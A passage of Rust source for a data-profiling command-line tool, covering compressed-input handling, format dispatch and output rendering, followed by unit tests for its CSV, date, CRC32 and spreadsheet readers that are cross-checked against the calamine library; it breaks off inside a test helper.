    fn flush(&mut self) -> std::io::Result<()> {
        self.file.flush()
    }
}

impl Drop for TempFile {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.path);
    }
}

/// If `path` ends in `.gz`/`.gzip` or `.zst`/`.zstd`, decompresses it into a
/// real temporary file and returns (the path to actually read bytes from,
/// the compression-stripped logical path used for format detection and
/// default output naming, a guard that deletes the temp file on drop).
/// Non-compressed input passes through unchanged with no guard.
fn decompress_if_needed(path: &Path) -> Result<(PathBuf, PathBuf, Option<TempFile>)> {
    use std::fs::File;
    use std::io::Write;

    let Some(compression) = compression_from_extension(path) else {
        return Ok((path.to_path_buf(), path.to_path_buf(), None));
    };

    let input = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
    let mut tmp = TempFile::new()?;
    match compression {
        Compression::Gzip => {
            let bytes =
                gzip_decompress(input).with_context(|| format!("failed to decompress {path:?}"))?;
            tmp.as_file_mut()
                .write_all(&bytes)
                .with_context(|| format!("failed to write decompressed data for {path:?}"))?;
        }
        Compression::Zstd => {
            let bytes = decompress_zstd(input, path)?;
            tmp.as_file_mut()
                .write_all(&bytes)
                .with_context(|| format!("failed to write decompressed data for {path:?}"))?;
        }
    }

    let logical_path = path.with_extension("");
    Ok((tmp.path().to_path_buf(), logical_path, Some(tmp)))
}

enum OutputFormat {
    Markdown,
    Json,
    JsonSchema,
}

impl OutputFormat {
    fn parse(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "md" | "markdown" => Ok(OutputFormat::Markdown),
            "json" => Ok(OutputFormat::Json),
            "json-schema" | "jsonschema" => Ok(OutputFormat::JsonSchema),
            other => {
                bail!("unrecognized --output-format '{other}' (expected md, json, or json-schema)")
            }
        }
    }
}

pub fn run() -> Result<()> {
    let args = Args::parse()?;

    let output_format = OutputFormat::parse(&args.output_format)?;

    // data.csv.gz reads exactly like data.csv from here on: read_path points
    // at the real (decompressed) bytes every reader below opens, logical_path
    // is the compression-stripped name used for format detection and default
    // output naming, and _decompressed_tmp just needs to outlive the reads.
    let (read_path, logical_path, _decompressed_tmp) = decompress_if_needed(&args.input_path)?;

    let format = detect_format(&read_path, &logical_path, &args.format)?;
    let file_name = args
        .input_path
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .into_owned();
    let file_stem = logical_path
        .file_stem()
        .unwrap_or_default()
        .to_string_lossy()
        .into_owned();

    // Every format ends up as the same shape - a table name mapped to its column
    // profiles - so JSON/Markdown rendering never needs to special-case SQLite's
    // (and Excel's, and INI's, and .npz's) multiple tables vs. everything
    // else's single implicit one.
    let tables: BTreeMap<String, Vec<ColumnProfile>> = if matches!(
        format,
        InputFormat::Sqlite | InputFormat::Xlsx | InputFormat::Ini | InputFormat::Npz
    ) {
        match format {
            InputFormat::Sqlite => columns_from_sqlite(&read_path, args.nrows, args.samples)?,
            InputFormat::Xlsx => columns_from_xlsx(&read_path, args.nrows, args.samples)?,
            InputFormat::Ini => columns_from_ini(&read_path, args.samples)?,
            InputFormat::Npz => columns_from_npz(&read_path, args.nrows, args.samples)?,
            _ => unreachable!("handled by the outer matches! guard"),
        }
        .into_iter()
        .collect()
    } else {
        let profiles: Vec<ColumnProfile> = match format {
            InputFormat::Csv => {
                let delim = args.delimiter.unwrap_or(',') as u8;
                let skip_rows = resolve_skip_rows(args.skip_rows, &read_path, delim);
                columns_from_csv(&read_path, args.nrows, delim, skip_rows)?
                    .into_iter()
                    .map(|c| profile_column(c, args.samples))
                    .collect()
            }
            InputFormat::Tsv => {
                let delim = args.delimiter.unwrap_or('\t') as u8;
                let skip_rows = resolve_skip_rows(args.skip_rows, &read_path, delim);
                columns_from_csv(&read_path, args.nrows, delim, skip_rows)?
                    .into_iter()
                    .map(|c| profile_column(c, args.samples))
                    .collect()
            }
            InputFormat::Json => columns_from_json(&read_path, args.nrows, args.samples)?,
            InputFormat::Parquet => columns_from_parquet(&read_path, args.nrows, args.samples)?,
            InputFormat::ArrowIpc => columns_from_arrow_ipc(&read_path, args.nrows, args.samples)?,
            InputFormat::Avro => columns_from_avro(&read_path, args.nrows, args.samples)?,
            InputFormat::MsgPack => columns_from_msgpack(&read_path, args.nrows, args.samples)?,
            InputFormat::Toml => columns_from_toml(&read_path, args.samples)?,
            InputFormat::Yaml => columns_from_yaml(&read_path, args.nrows, args.samples)?,
            InputFormat::Cbor => columns_from_cbor(&read_path, args.nrows, args.samples)?,
            InputFormat::Xml => columns_from_xml(&read_path, args.nrows, args.samples)?,
            InputFormat::FixedWidth => {
                let widths = args.widths.as_deref().filter(|w| !w.is_empty()).ok_or_else(|| {
                    anyhow!(
                        "--format fixed-width needs --widths (comma-separated character counts, e.g. --widths 10,5,20) - there's no delimiter to split fields on"
                    )
                })?;
                columns_from_fixed_width(&read_path, args.nrows, widths)?
                    .into_iter()
                    .map(|c| profile_column(c, args.samples))
                    .collect()
            }
            InputFormat::Npy => columns_from_npy(&read_path, args.nrows, args.samples)?,
            InputFormat::CommonLog => columns_from_weblog(&read_path, args.nrows, false)?
                .into_iter()
                .map(|c| profile_column(c, args.samples))
                .collect(),
            InputFormat::CombinedLog => columns_from_weblog(&read_path, args.nrows, true)?
                .into_iter()
                .map(|c| profile_column(c, args.samples))
                .collect(),
            InputFormat::Syslog => columns_from_syslog(&read_path, args.nrows, false)?
                .into_iter()
                .map(|c| profile_column(c, args.samples))
                .collect(),
            InputFormat::Syslog5424 => columns_from_syslog(&read_path, args.nrows, true)?
                .into_iter()
                .map(|c| profile_column(c, args.samples))
                .collect(),
            InputFormat::Dbase => columns_from_dbase(&read_path, args.nrows, args.samples)?,
            InputFormat::Stata => columns_from_stata(&read_path, args.nrows, args.samples)?,
            InputFormat::Sas7bdat => columns_from_sas7bdat(&read_path, args.nrows, args.samples)?,
            InputFormat::Sqlite | InputFormat::Xlsx | InputFormat::Ini | InputFormat::Npz => {
                unreachable!("handled above")
            }
        };
        std::iter::once((file_stem, profiles)).collect()
    };

    let rendered = match output_format {
        OutputFormat::Markdown => render_markdown(&file_name, &tables),
        OutputFormat::Json => render_json(&file_name, &format, &tables)?,
        OutputFormat::JsonSchema => render_json_schema(&file_name, &tables)?,
    };

    let table_count = tables.len();
    let col_count: usize = tables.values().map(Vec::len).sum();

    // '-' means "write to stdout" - and when it does, the status line goes to
    // stderr so stdout stays pure output a script or agent can pipe directly
    // (e.g. `sniff-rs data.csv - --output-format json | jq .`).
    if args.output_path.as_deref() == Some(Path::new("-")) {
        print!("{rendered}");
        eprintln!("{table_count} tables, {col_count} columns -> (stdout)");
    } else {
        let default_ext = match output_format {
            OutputFormat::Markdown => "dictionary.md",
            OutputFormat::Json => "dictionary.json",
            OutputFormat::JsonSchema => "dictionary.schema.json",
        };
        let output_path = args
            .output_path
            .clone()
            .unwrap_or_else(|| logical_path.with_extension(default_ext));
        fs::write(&output_path, &rendered)
            .with_context(|| format!("failed to write {output_path:?}"))?;
        eprintln!(
            "{table_count} tables, {col_count} columns -> {}",
            output_path.display()
        );
    }

    Ok(())
}

// --- Unit tests for the heuristic engine ---
// The functions below are the part of this tool most likely to grow subtle
// bugs under a small direct test (see CLAUDE.md's Testing section) - unlike
// the readers, which are covered end-to-end by tests/integration.rs.

#[cfg(test)]
mod tests {
    use super::*;

    // parse_csv's own edge cases, verified directly against csv-core's
    // source (transition_nfa) before being trusted, and covering shapes
    // the committed CSV fixtures don't specifically stress (they're all
    // single-line records) - the manual verification this project's own
    // discipline (see CLAUDE.md's design-philosophy section) always turns
    // into a permanent test rather than a one-off check.
    #[test]
    fn parse_csv_preserves_a_newline_embedded_in_a_quoted_field() {
        let records = parse_csv("id,note\n1,\"line one\nline two\",10\n", b',');
        assert_eq!(
            records,
            vec![vec!["id", "note"], vec!["1", "line one\nline two", "10"],]
        );
    }

    #[test]
    fn parse_csv_appends_content_after_a_closing_quote_to_the_same_field() {
        // csv-core's own permissive InDoubleEscapedQuote -> InField
        // transition: "abc"def is one field, "abcdef", not an error.
        let records = parse_csv("id,note\n1,\"abc\"def\n", b',');
        assert_eq!(records, vec![vec!["id", "note"], vec!["1", "abcdef"]]);
    }

    #[test]
    fn parse_csv_treats_crlf_bare_lf_and_bare_cr_as_equivalent_terminators() {
        let records = parse_csv("id,note\r\n1,crlf\n2,lf\r3,cr\r\n", b',');
        assert_eq!(
            records,
            vec![
                vec!["id", "note"],
                vec!["1", "crlf"],
                vec!["2", "lf"],
                vec!["3", "cr"],
            ]
        );
    }

    #[test]
    fn parse_csv_skips_genuinely_blank_lines_without_producing_empty_records() {
        let records = parse_csv("a,b\n\n\nc,d\n", b',');
        assert_eq!(records, vec![vec!["a", "b"], vec!["c", "d"]]);
    }

    #[test]
    fn parse_csv_strips_a_leading_bom_but_not_one_appearing_elsewhere() {
        let records = parse_csv("\u{FEFF}name,value\nfirst,\u{FEFF}1\n", b',');
        assert_eq!(
            records,
            vec![vec!["name", "value"], vec!["first", "\u{FEFF}1"],]
        );
    }

    #[test]
    fn parse_csv_handles_an_unterminated_quote_without_hanging_or_panicking() {
        let records = parse_csv("id,note\n1,\"never closed\n2,plain\n", b',');
        assert_eq!(
            records,
            vec![vec!["id", "note"], vec!["1", "never closed\n2,plain\n"]]
        );
    }

    // days_from_civil/civil_from_days (Howard Hinnant's civil-calendar
    // algorithm) and weekday_index, cross-checked against Python's
    // datetime module across leap-year and century-boundary cases before
    // being trusted - the same values used to verify this by hand before
    // it was ever wired into the rest of this file, now locked in
    // permanently. Weekday is Python's `date.weekday()` (Mon=0) converted
    // to this file's own Sun=0 convention (`(mon0 + 1) % 7`).
    #[test]
    fn days_from_civil_matches_python_datetime_across_leap_and_century_boundaries() {
        let cases: &[(i64, u32, u32, i64, u32)] = &[
            (1970, 1, 1, 0, 4),
            (1970, 1, 2, 1, 5),
            (1969, 12, 31, -1, 3),
            (2000, 2, 29, 11016, 2),
            (2024, 1, 15, 19737, 1),
            (1900, 1, 1, -25567, 1),
            (2100, 3, 1, 47541, 1),
            (1600, 2, 29, -135081, 2),
            (2400, 2, 29, 157113, 2),
            (1, 1, 1, -719162, 1),
            (9999, 12, 31, 2932896, 5),
            (2024, 2, 29, 19782, 4),
            (2023, 2, 28, 19416, 2),
            (1899, 12, 31, -25568, 0),
            (2069, 12, 31, 36524, 2),
            (1970, 12, 31, 364, 4),
        ];
        for &(y, m, d, expected_days, expected_weekday) in cases {
            let days = days_from_civil(y, m, d);
            assert_eq!(days, expected_days, "{y}-{m}-{d}: days");
            assert_eq!(
                weekday_index(days),
                expected_weekday,
                "{y}-{m}-{d}: weekday"
            );
            assert_eq!(civil_from_days(days), (y, m, d), "{y}-{m}-{d}: round-trip");
        }
    }

    // crc32's standard published check value (RFC 1952's own reference,
    // shared by every CRC-32/ISO-HDLC implementation) - the cheapest
    // possible proof the table/polynomial are right, before trusting it
    // against anything gzip-shaped.
    #[test]
    fn crc32_matches_the_standard_check_value() {
        assert_eq!(crc32(b"123456789"), 0xCBF4_3926);
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn zip_archive_reads_and_verifies_real_xlsx_entries() {
        use xlsx_support::xml_parse;
        use zip_support::ZipArchive;

        let archive = ZipArchive::open(Path::new("tests/fixtures/sample.xlsx")).unwrap();
        let names: Vec<&str> = archive.names().collect();
        for expected in [
            "docProps/app.xml",
            "docProps/core.xml",
            "xl/theme/theme1.xml",
            "xl/worksheets/sheet1.xml",
            "xl/styles.xml",
            "_rels/.rels",
            "xl/workbook.xml",
            "xl/_rels/workbook.xml.rels",
            "[Content_Types].xml",
        ] {
            assert!(names.contains(&expected), "missing entry {expected}");
        }
        let expected_sizes = [
            ("docProps/app.xml", 205u32, 1213056838u32),
            ("docProps/core.xml", 382, 2569367014),
            ("xl/theme/theme1.xml", 6994, 1413937688),
            ("xl/worksheets/sheet1.xml", 2572, 2067080184),
            ("xl/styles.xml", 2620, 4281628671),
            ("_rels/.rels", 534, 2330675127),
            ("xl/workbook.xml", 598, 3796856708),
            ("xl/_rels/workbook.xml.rels", 507, 3135499059),
            ("[Content_Types].xml", 983, 2218952347),
        ];
        for (name, size, crc) in expected_sizes {
            let bytes = archive.read(name).unwrap();
            assert_eq!(bytes.len() as u32, size, "{name}: size");
            assert_eq!(crc32(&bytes), crc, "{name}: crc32");
        }
        let workbook = archive.read("xl/workbook.xml").unwrap();
        let text = String::from_utf8(workbook).unwrap();
        assert!(text.contains("<workbook"), "not workbook XML: {text}");

        let root = xml_parse(&text).unwrap();
        assert_eq!(root.name, "workbook");
        let sheets = root.child("sheets").unwrap();
        let sheet_names: Vec<&str> = sheets
            .children_named("sheet")
            .filter_map(|s| s.attr("name"))
            .collect();
        assert_eq!(sheet_names, vec!["sample"]);

        // Parse every XML entry across every real fixture, not just
        // workbook.xml - proves the parser holds up on real nested
        // content (styles.xml's numFmt/cellXfs tables, sheet1.xml's row/
        // c/v cell structure with shared-string indices, unicode text
        // content, etc.), not just the one simplest document.
        for f in [
            "tests/fixtures/sample.xlsx",
            "tests/fixtures/multi_sheet.xlsx",
            "tests/fixtures/type_detection.xlsx",
            "tests/fixtures/edge_zero_rows_and_unicode.xlsx",
            "tests/fixtures/edge_xlsx_native_date_cells.xlsx",
        ] {
            let archive = ZipArchive::open(Path::new(f)).unwrap();
            for name in archive.names().map(str::to_string).collect::<Vec<_>>() {
                if name.ends_with(".xml") || name.ends_with(".rels") {
                    let bytes = archive.read(&name).unwrap();
                    let text = String::from_utf8(bytes).unwrap();
                    xml_parse(&text).unwrap_or_else(|e| panic!("{f} {name}: {e:?}"));
                }
            }
        }

        for f in [
            "tests/fixtures/multi_sheet.xlsx",
            "tests/fixtures/type_detection.xlsx",
            "tests/fixtures/edge_zero_rows_and_unicode.xlsx",
            "tests/fixtures/edge_xlsx_native_date_cells.xlsx",
        ] {
            let archive = ZipArchive::open(Path::new(f)).unwrap();
            for name in archive.names().map(str::to_string).collect::<Vec<_>>() {
                let entry_crc = archive
                    .entries
                    .iter()
                    .find(|e| e.name == name)
                    .unwrap()
                    .crc32;
                let bytes = archive
                    .read(&name)
                    .unwrap_or_else(|e| panic!("{f} {name}: {e:?}"));
                assert_eq!(crc32(&bytes), entry_crc, "{f} {name}: crc32");
            }
        }
    }

    // Ported directly from calamine's own `formats.rs` test module
    // (`test_is_date_format`, itself ported from openpyxl) - every case
    // A representative slice of calamine's own `test_dates_only_1900_epoch`/
    // `test_datetimes_1900_epoch` reference tables (203 and 99 cases
    // respectively) - the *full* set was cross-checked against a throwaway
    // harness built from calamine's actual test data before this was
    // trusted (see CLAUDE.md's Dependency footprint section), spanning
    // 1899 through 9999 at whole-second precision; this locks in the
    // boundary/edge cases permanently: the epoch itself, the fictitious
    // 1900-02-29 (serial 60, Excel's own Lotus 1-2-3 leap-year bug) and
    // its immediate neighbors, a real leap day (1904), and the far end of
    // Excel's supported range.
    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsx_serial_to_ymd_matches_calamine_reference_dates() {
        use xlsx_support::xlsx_serial_to_ymd as ymd;

        for (serial, y, m, d) in [
            (0.0, 1899, 12, 31),
            (1.0, 1900, 1, 1),
            (59.0, 1900, 2, 28),
            (60.0, 1900, 2, 29), // the fake leap day itself
            (61.0, 1900, 3, 1),
            (365.0, 1900, 12, 30),
            (1461.0, 1903, 12, 31),
            (1462.0, 1904, 1, 1),
            (1521.0, 1904, 2, 29), // a real leap day
            (36161.0, 1999, 1, 1),
            (45306.0, 2024, 1, 15),
            (2958465.0, 9999, 12, 31),
        ] {
            assert_eq!(ymd(serial), (y, m, d), "serial {serial}");
        }
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsx_serial_to_hms_resolves_a_fractional_day_to_whole_seconds() {
        use xlsx_support::xlsx_serial_to_hms as hms;

        // 45306.4375 -> 2024-01-15, 0.4375 * 24h = 10:30:00 exactly.
        assert_eq!(hms(45306.4375), (10, 30, 0));
        assert_eq!(hms(45306.0), (0, 0, 0));
        // 45307.61458333334 -> ~14:45:00 (calamine's own reference: this
        // exact value resolves to 14:45:00 at whole-second precision).
        assert_eq!(hms(45307.61458333334), (14, 45, 0));
    }

    // checked against `xlsx_is_date_format_code`, the hand-rolled port of
    // calamine's `detect_custom_number_format`. Covers the tricky
    // corners: quoted literal text, the `_`/`\` escape and `*` fill
    // characters (a format token right after one is a literal, not a
    // real directive - `#,##0*y` must NOT be detected as a date despite
    // containing 'y'), bracketed `[Red]`/elapsed-time `[h]` sections, and
    // AM/PM markers.
    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsx_is_date_format_code_matches_calamine_reference_cases() {
        use xlsx_support::xlsx_is_date_format_code as is_date;

        for fmt in [
            "DD/MM/YY",
            "H:MM:SS;@",
            "m\"M\"d\"D\";@",
            "[$-404]e\"\\xfc\"m\"\\xfc\"d\"\\xfc\"",
            "ha/p\\\\m",
            "*-yyyy-mm-dd",
        ] {
            assert!(is_date(fmt), "expected a date format: {fmt:?}");
        }
        for fmt in [
            "#,##0\\ [$\\u20bd-46D]",
            "\"Y: \"0.00\"m\";\"Y: \"-0.00\"m\";\"Y: <num>m\";@",
            "#,##0\\ [$''u20bd-46D]",
            "\"$\"#,##0_);[Red](\"$\"#,##0)",
            "0_ ;[Red]\\-0\\ ",
            "\\Y000000",
            "#,##0.0####\" YMD\"",
            "[>=100][Magenta].00",
            "[>=100][Magenta]General",
            "#,##0.00\\ _M\"H\"_);[Red]#,##0.00\\ _M\"S\"_)",
            "#,##0*y",
            "0\"x\"*d",
            "*-#,##0",
        ] {
            assert!(!is_date(fmt), "expected NOT a date format: {fmt:?}");
        }
        // TimeDelta (elapsed-time) formats: this project doesn't
        // distinguish these from a real calendar date/time (matching its
        // own pre-existing calamine-based behavior), so they're still
        // "date-shaped" here.
        for fmt in [
            "[h]:mm:ss",
            "[h]",
            "[ss]",
            "[s].000",
            "[m]",
            "[mm]",
            "[Blue]\\+[h]:mm;[Red]\\-[h]:mm;[Green][h]:mm",
            "[>=100][Magenta][s].00",
            "[h]:mm;[=0]\\-",
        ] {
            assert!(is_date(fmt), "expected a date/timedelta format: {fmt:?}");
        }
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsx_ooxml_reader_matches_calamine_output_exactly() {
        for f in [
            "tests/fixtures/sample.xlsx",
            "tests/fixtures/multi_sheet.xlsx",
            "tests/fixtures/type_detection.xlsx",
            "tests/fixtures/edge_zero_rows_and_unicode.xlsx",
            "tests/fixtures/edge_xlsx_native_date_cells.xlsx",
            "tests/fixtures/edge_xlsx_shared_strings.xlsx",
            "tests/fixtures/edge_xlsx_formula_and_error.xlsx",
        ] {
            let path = Path::new(f);
            let expected = columns_from_xlsx_calamine(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} calamine: {e:?}"));
            let got = xlsx_support::columns_from_xlsx_ooxml(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} ooxml: {e:?}"));
            assert_eq!(got.len(), expected.len(), "{f}: sheet count");
            for ((got_name, got_cols), (exp_name, exp_cols)) in got.iter().zip(expected.iter()) {
                assert_eq!(got_name, exp_name, "{f}: sheet name");
                assert_eq!(
                    got_cols.len(),
                    exp_cols.len(),
                    "{f} sheet '{exp_name}': column count"
                );
                for (gc, ec) in got_cols.iter().zip(exp_cols.iter()) {
                    assert_eq!(gc.name, ec.name, "{f} sheet '{exp_name}': column name");
                    assert_eq!(
                        gc.current_type, ec.current_type,
                        "{f} sheet '{exp_name}' col '{}': current_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.ideal_type, ec.ideal_type,
                        "{f} sheet '{exp_name}' col '{}': ideal_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.missing_pct, ec.missing_pct,
                        "{f} sheet '{exp_name}' col '{}': missing_pct",
                        ec.name
                    );
                    assert_eq!(
                        gc.sample_values, ec.sample_values,
                        "{f} sheet '{exp_name}' col '{}': sample_values",
                        ec.name
                    );
                }
            }
        }
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn xls_reader_matches_calamine_output_exactly() {
        for f in [
            "tests/fixtures/type_detection_lo.xls",
            "tests/fixtures/edge_xls_native_date_cells.xls",
            "tests/fixtures/edge_xls_shared_strings.xls",
            "tests/fixtures/edge_xls_formula_and_error.xls",
            "tests/fixtures/multi_sheet_lo.xls",
            "tests/fixtures/edge_zero_rows_and_unicode_lo.xls",
        ] {
            let path = Path::new(f);
            let expected = columns_from_xlsx_calamine(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} calamine: {e:?}"));
            let got = xlsx_support::columns_from_xls(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} xls: {e:?}"));
            assert_eq!(got.len(), expected.len(), "{f}: sheet count");
            for ((got_name, got_cols), (exp_name, exp_cols)) in got.iter().zip(expected.iter()) {
                assert_eq!(got_name, exp_name, "{f}: sheet name");
                assert_eq!(
                    got_cols.len(),
                    exp_cols.len(),
                    "{f} sheet '{exp_name}': column count"
                );
                for (gc, ec) in got_cols.iter().zip(exp_cols.iter()) {
                    assert_eq!(gc.name, ec.name, "{f} sheet '{exp_name}': column name");
                    assert_eq!(
                        gc.current_type, ec.current_type,
                        "{f} sheet '{exp_name}' col '{}': current_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.ideal_type, ec.ideal_type,
                        "{f} sheet '{exp_name}' col '{}': ideal_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.missing_pct, ec.missing_pct,
                        "{f} sheet '{exp_name}' col '{}': missing_pct",
                        ec.name
                    );
                    assert_eq!(
                        gc.sample_values, ec.sample_values,
                        "{f} sheet '{exp_name}' col '{}': sample_values",
                        ec.name
                    );
                }
            }
        }
    }

    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsb_reader_matches_calamine_output_exactly() {
        // Real files from Apache POI's own test-data (see
        // tests/fixtures/poi_xlsb_PROVENANCE.md). Only poi_sample.xlsb is
        // compared here - poi_simple.xlsb, poi_date.xlsb, and
        // poi_various.xlsb each trip a real, independently-confirmed bug
        // in calamine 0.36.1 itself, so comparing this reader's output
        // against calamine's on those three would be comparing against a
        // known-wrong oracle. Each has its own dedicated test instead,
        // asserting this reader's own independently-verified correct
        // behavior directly - see
        // xlsb_reader_succeeds_on_a_real_file_that_breaks_calamine_and_pyxlsb,
        // xlsb_reader_resolves_a_date_calamine_fails_to_because_of_its_own_stream_desync_bug,
        // and xlsb_reader_captures_a_formula_error_cell_calamine_silently_drops below.
        for f in ["tests/fixtures/poi_sample.xlsb"] {
            let path = Path::new(f);
            let expected = columns_from_xlsx_calamine(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} calamine: {e:?}"));
            let got = xlsx_support::columns_from_xlsb(path, None, 3)
                .unwrap_or_else(|e| panic!("{f} xlsb: {e:?}"));
            assert_eq!(got.len(), expected.len(), "{f}: sheet count");
            for ((got_name, got_cols), (exp_name, exp_cols)) in got.iter().zip(expected.iter()) {
                assert_eq!(got_name, exp_name, "{f}: sheet name");
                assert_eq!(
                    got_cols.len(),
                    exp_cols.len(),
                    "{f} sheet '{exp_name}': column count"
                );
                for (gc, ec) in got_cols.iter().zip(exp_cols.iter()) {
                    assert_eq!(gc.name, ec.name, "{f} sheet '{exp_name}': column name");
                    assert_eq!(
                        gc.current_type, ec.current_type,
                        "{f} sheet '{exp_name}' col '{}': current_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.ideal_type, ec.ideal_type,
                        "{f} sheet '{exp_name}' col '{}': ideal_type",
                        ec.name
                    );
                    assert_eq!(
                        gc.missing_pct, ec.missing_pct,
                        "{f} sheet '{exp_name}' col '{}': missing_pct",
                        ec.name
                    );
                    assert_eq!(
                        gc.sample_values, ec.sample_values,
                        "{f} sheet '{exp_name}' col '{}': sample_values",
                        ec.name
                    );
                }
            }
        }
    }

    /// `poi_simple.xlsb` is a real file that both calamine 0.36.1 and
    /// Python's independent `pyxlsb` fail on entirely (confirmed
    /// separately against both before writing this test) - its
    /// `BrtBundleSh` records use a 12-byte fixed header instead of the
    /// 8-byte one both libraries hardcode. Verified independently of
    /// both (a from-scratch manual byte-level scan of the file's own
    /// worksheet parts, not just "the code didn't crash") to confirm the
    /// resolved content is genuinely correct: sheet1 has exactly one
    /// real cell (a shared-string header at row 0, col 0), and sheet2/
    /// sheet3 are legitimately empty (no cell records at all before
    /// their own BrtEndSheetData) - so only one table is expected here,
    /// not a reader bug silently dropping two sheets.
    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsb_reader_succeeds_on_a_real_file_that_breaks_calamine_and_pyxlsb() {
        let path = Path::new("tests/fixtures/poi_simple.xlsb");
        let tables = xlsx_support::columns_from_xlsb(path, None, 3).unwrap();
        assert_eq!(tables.len(), 1, "sheet2/sheet3 are genuinely empty");
        let (name, cols) = &tables[0];
        assert_eq!(name, "Sheet1");
        assert_eq!(cols.len(), 1);
        assert_eq!(
            cols[0].name,
            "This is an example spreadsheet created with Microsoft Excel 2007 Beta 2."
        );
    }

    /// `poi_date.xlsb`'s `xl/styles.bin` has several records of other
    /// types (fonts, fills, etc., none zero-length) before its
    /// `BrtBeginCellXFs` record - and calamine's own `read_styles`
    /// (`xlsb/mod.rs`) has a real bug on exactly this shape: its
    /// top-level dispatch loop calls `iter.read_type()` for every
    /// record, but only calls `fill_buffer()` (which is what actually
    /// advances the reader past that record's body) inside the
    /// `0x0267`/`0x0269` match arms - every *other* record type's body
    /// is silently never consumed. The very first non-zero-length,
    /// non-matching record permanently desyncs the rest of the stream,
    /// so calamine's search for the real `BrtBeginCellXFs` record either
    /// never finds it or finds one at the wrong offset - confirmed
    /// directly against calamine's source, not just inferred from its
    /// output. The practical symptom: this file's one real cell (a date,
    /// styled with the builtin date format id 14) renders as calamine's
    /// own CLI-facing output shows it - the raw, unresolved serial
    /// `"41286"` - instead of a real date. This reader's own
    /// `Biff12RecordIter` never has this bug (every record's length is
    /// consumed unconditionally in one place, regardless of type), so it
    /// resolves the date correctly.
    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsb_reader_resolves_a_date_calamine_fails_to_because_of_its_own_stream_desync_bug() {
        let path = Path::new("tests/fixtures/poi_date.xlsb");
        let tables = xlsx_support::columns_from_xlsb(path, None, 3).unwrap();
        assert_eq!(tables.len(), 1);
        let (_, cols) = &tables[0];
        assert_eq!(cols.len(), 1);
        assert_eq!(cols[0].name, "2013-01-12");
    }

    /// `poi_various.xlsb` has a formula cell whose cached result is an
    /// error (`#NAME?`, BIFF12 record type `BrtFmlaError`/`0x000B`).
    /// calamine's own `next_cell` (used by `worksheet_range()`, the API
    /// this project's calamine-backed reader calls) handles a *literal*
    /// error cell (`BrtCellError`/`0x0003`) but has no match arm at all
    /// for `BrtFmlaError` - it falls into that function's catch-all
    /// `_ => continue`, so the cell is silently dropped from calamine's
    /// output entirely rather than surfacing as `"#NAME?"`. Confirmed
    /// directly against `xlsb/cells_reader.rs`'s source, not assumed.
    /// This reader treats `BrtFmlaError` the same as `BrtCellError` (see
    /// `xlsb_parse_sheet`), matching the `.xls`/`.xlsx` readers' own
    /// existing formula-error handling instead of reproducing this gap.
    #[cfg(feature = "xlsx")]
    #[test]
    fn xlsb_reader_captures_a_formula_error_cell_calamine_silently_drops() {
        let path = Path::new("tests/fixtures/poi_various.xlsb");
        let tables = xlsx_support::columns_from_xlsb(path, None, 100).unwrap();
        let (_, cols) = &tables[0];
        let col = cols.iter().find(|c| c.name == "This is a string").unwrap();
        assert!(
            col.sample_values.iter().any(|v| v == "#NAME?"),
            "expected a captured #NAME? formula-error value: {:?}",
            col.sample_values
        );
    }

    /// Cross-verifies the hand-rolled parser against `rust-ini` itself
    /// (kept as a dev-only oracle - see Cargo.toml), on both this
    /// project's own existing fixtures and a dedicated quoting/escaping
    /// stress fixture covering rust-ini's own documented
    /// `'Single Quote' with extra value` concatenation example, escaped
    /// quotes, `\t`/`\n` escapes, the `:` delimiter, trailing-whitespace
    /// trimming, and an empty value. Sections with no properties are
    /// filtered from both sides before comparing - the same filter
    /// `columns_from_ini` itself applies, so this compares what's
    /// actually observable through the reader, not implementation-
    /// internal section bookkeeping (rust-ini eagerly creates an empty
    /// `Properties` entry for every `[header]` line even with no keys
    /// following; this parser creates a section's entry lazily, on its
    /// first key - a real, confirmed difference that never surfaces
    /// past `columns_from_ini`'s own existing empty-section filter).
    /// Also cross-checked, transiently and not committed (matching this
    /// project's usual large-external-corpus practice), against a real
    /// `php.ini-production` (1,878 lines) and a real Samba
    /// `smb.conf.default` (223 lines) - both matched exactly, with zero
    /// hand-rolled-parser bugs found; see CLAUDE.md's Dependency
    /// footprint section for the full write-up.
    /// The old `xmltree`-based reader, kept test-only for cross-
    /// verification (`xmltree` itself is a dev-only dependency now -
    /// see Cargo.toml) - a near-verbatim copy of what `columns_from_xml`
    /// used to be before the hand-rolled `xml_support` module replaced
    /// it. Never called on adversarial input (it has no depth guard at
    /// all, exactly like the original code before that gap was found),
    /// only on real fixtures.
    #[cfg(all(test, feature = "xml"))]
    fn columns_from_xml_via_xmltree(path: &Path, n_samples: usize) -> Vec<ColumnProfile> {
        use xmltree::XMLNode;

        fn to_json(el: &xmltree::Element) -> JsonValue {
            let mut obj = serde_json::Map::new();
            for (k, v) in &el.attributes {
                obj.insert(format!("@{k}"), JsonValue::String(v.clone()));
            }
            let mut text = String::new();
            let mut child_order: Vec<String> = Vec::new();
            let mut child_values: HashMap<String, Vec<JsonValue>> = HashMap::new();
            for node in &el.children {
                match node {
                    XMLNode::Element(child) => {
                        child_values
                            .entry(child.name.clone())
                            .or_insert_with(|| {
                                child_order.push(child.name.clone());
                                Vec::new()
                            })
                            .push(to_json(child));
                    }
                    XMLNode::Text(t) | XMLNode::CData(t) => text.push_str(t),
                    XMLNode::Comment(_) | XMLNode::ProcessingInstruction(..) => {}
                }
            }
            for name in child_order {
                let mut values = child_values.remove(&name).unwrap();
